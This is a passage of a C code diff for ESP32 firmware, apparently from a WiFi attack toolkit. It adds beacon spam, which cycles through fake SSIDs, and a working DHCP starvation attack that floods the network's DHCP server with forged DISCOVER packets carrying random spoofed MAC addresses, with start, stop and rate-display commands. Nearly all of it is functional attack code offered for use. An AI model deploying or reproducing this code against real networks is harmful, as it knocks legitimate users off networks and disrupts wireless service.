+            --g_beacon_list_count;
+            printf("Removed SSID from beacon list: %s\n", ssid);
+            return;
+        }
+    }
+    printf("SSID not found in list: %s\n", ssid);
+}
+
+// Clear the beacon list
+void wifi_manager_clear_beacon_list(void) {
+    g_beacon_list_count = 0;
+    printf("Cleared beacon list\n");
+}
+
+// Show the beacon list
+void wifi_manager_show_beacon_list(void) {
+    printf("Beacon list (%d entries):\n", g_beacon_list_count);
+    for (int i = 0; i < g_beacon_list_count; ++i) {
+        printf("  %d: %s\n", i, g_beacon_list[i]);
+    }
+}
+
+// Start beacon spam using the saved list
+void wifi_manager_start_beacon_list(void) {
+    if (g_beacon_list_count == 0) {
+        printf("No SSIDs in beacon list\n");
+        return;
+    }
+    // Ensure any existing beacon spam is stopped
+    wifi_manager_stop_beacon();
+    // Notify user that list-based beacon spam is starting
+    printf("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
+    TERMINAL_VIEW_ADD_TEXT("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
+    // Launch the beacon list task
+    xTaskCreate(wifi_beacon_list_task, "beacon_list", 2048, NULL, 5, &beacon_task_handle);
+    beacon_task_running = 1;
+    rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
+}
+
+// Task for cycling through beacon list
+static void wifi_beacon_list_task(void *param) {
+    (void)param;
+    while (beacon_task_handle) {
+        for (int i = 0; i < g_beacon_list_count; ++i) {
+            wifi_manager_broadcast_ap(g_beacon_list[i]);
+            vTaskDelay(pdMS_TO_TICKS(settings_get_broadcast_speed(&G_Settings)));
+        }
+    }
+    vTaskDelete(NULL);
+}
+
+// Add DHCP starvation support start
+static volatile bool dhcp_starve_running = false;
+static volatile uint32_t dhcp_starve_packets_sent = 0;
+static TaskHandle_t dhcp_starve_task_handle = NULL;
+static TaskHandle_t dhcp_starve_display_task_handle = NULL;
+
+#pragma pack(push,1)
+typedef struct {
+    uint8_t op, htype, hlen, hops;
+    uint32_t xid;
+    uint16_t secs, flags;
+    uint32_t ciaddr, yiaddr, siaddr, giaddr;
+    uint8_t chaddr[16];
+    uint8_t sname[64];
+    uint8_t file[128];
+    uint8_t options[312];
+} dhcp_packet_t;
+#pragma pack(pop)
+
+static void dhcp_starve_task(void *param) {
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    int broadcast = 1;
+    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
+    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(67), .sin_addr.s_addr = htonl(INADDR_BROADCAST) };
+    while (dhcp_starve_running) {
+        dhcp_packet_t pkt;
+        memset(&pkt, 0, sizeof(pkt));
+        pkt.op = 1; pkt.htype = 1; pkt.hlen = 6;
+        pkt.xid = esp_random();
+        pkt.flags = htons(0x8000);
+        esp_fill_random(pkt.chaddr, 6);
+        pkt.chaddr[0] &= 0xFE; pkt.chaddr[0] |= 0x02;
+        pkt.options[0] = 99; pkt.options[1] = 130; pkt.options[2] = 83; pkt.options[3] = 99;
+        pkt.options[4] = 53; pkt.options[5] = 1; pkt.options[6] = 1; pkt.options[7] = 255;
+        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
+        dhcp_starve_packets_sent++;
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+    close(sock);
+    vTaskDelete(NULL);
+}
+
+static void dhcp_starve_display_task(void *param) {
+    uint32_t prev_total = 0;
+    while (dhcp_starve_running) {
+        vTaskDelay(pdMS_TO_TICKS(5000));
+        uint32_t total = dhcp_starve_packets_sent;
+        uint32_t interval = total - prev_total;
+        prev_total = total;
+        uint32_t pps = interval / 5;
+        printf("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
+               (unsigned long)pps, (unsigned long)total);
+    }
+    vTaskDelete(NULL);
+}
+
+void wifi_manager_start_dhcpstarve(int threads) {
+    // Prevent starting DHCP starvation when not associated to an AP
+    EventBits_t bits = xEventGroupGetBits(wifi_event_group);
+    if (!(bits & WIFI_CONNECTED_BIT)) {
+        printf("Not connected to an AP\n");
+        TERMINAL_VIEW_ADD_TEXT("Not connected to an AP\n");
+        return;
+    }
+    if (dhcp_starve_running) {
+        printf("DHCP-Starve already running\n");
+        return;
+    }
+    dhcp_starve_running = true;
+    dhcp_starve_packets_sent = 0;
+    xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
+    xTaskCreate(dhcp_starve_display_task, "dhcp_disp", 2048, NULL, 5, &dhcp_starve_display_task_handle);
+}
+
+void wifi_manager_stop_dhcpstarve(void) {
+    if (!dhcp_starve_running) {
+        printf("DHCP-Starve not running\n");
+        return;
+    }
+    dhcp_starve_running = false;
+}
+
+void wifi_manager_dhcpstarve_display(void) {
+    printf("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
+}
+
+void wifi_manager_dhcpstarve_help(void) {
+    printf("Usage: dhcpstarve start [threads]\\n       dhcpstarve stop\\n       dhcpstarve display\\n");
 }
